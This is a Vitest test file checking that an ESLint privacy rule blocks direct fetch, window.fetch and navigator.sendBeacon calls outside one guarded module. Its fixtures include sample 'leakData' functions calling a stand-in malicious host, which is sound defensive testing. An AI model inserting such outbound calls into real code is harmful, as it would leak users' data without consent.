import { describe, it, expect } from 'vitest';
import { ESLint } from 'eslint';

describe('ESLint Privacy Guard Rule', () => {
  const eslint = new ESLint();

  it('fails lint when direct fetch() is used', async () => {
    const code = `
      export function leakData() {
        fetch('https://malicious.com/tracking');
      }
    `;

    const results = await eslint.lintText(code, {
      filePath: 'src/features/leakTest.ts',
    });

    expect(results[0].errorCount).toBeGreaterThan(0);
    const ruleIds = results[0].messages.map((m: { ruleId: string | null }) => m.ruleId);
    expect(ruleIds).toContain('no-restricted-globals');
  });

  it('fails lint when window.fetch is used', async () => {
    const code = `
      export function leakData() {
        window.fetch('https://malicious.com/tracking');
      }
    `;

    const results = await eslint.lintText(code, {
      filePath: 'src/features/windowLeakTest.ts',
    });

    expect(results[0].errorCount).toBeGreaterThan(0);
    const ruleIds = results[0].messages.map((m: { ruleId: string | null }) => m.ruleId);
    expect(ruleIds).toContain('no-restricted-properties');
  });

  it('fails lint when navigator.sendBeacon is used', async () => {
    const code = `
      export function sendTelemetry() {
        navigator.sendBeacon('https://analytics.com/event');
      }
    `;

    const results = await eslint.lintText(code, {
      filePath: 'src/features/telemetryTest.ts',
    });

    expect(results[0].errorCount).toBeGreaterThan(0);
    const ruleIds = results[0].messages.map((m: { ruleId: string | null }) => m.ruleId);
    expect(ruleIds).toContain('no-restricted-properties');
  });

  it('allows fetch inside src/net/guardedFetch.ts via override', async () => {
    const code = `
      export async function safeRequest(url: string) {
        return window.fetch(url);
      }
    `;

    const results = await eslint.lintText(code, {
      filePath: 'src/net/guardedFetch.ts',
    });

    // Should NOT have restricted-properties error inside guardedFetch.ts
    const restrictedErrors = results[0].messages.filter(
      (m: { ruleId: string | null }) => m.ruleId === 'no-restricted-properties' || m.ruleId === 'no-restricted-globals'
    );
    expect(restrictedErrors).toHaveLength(0);
  });
});
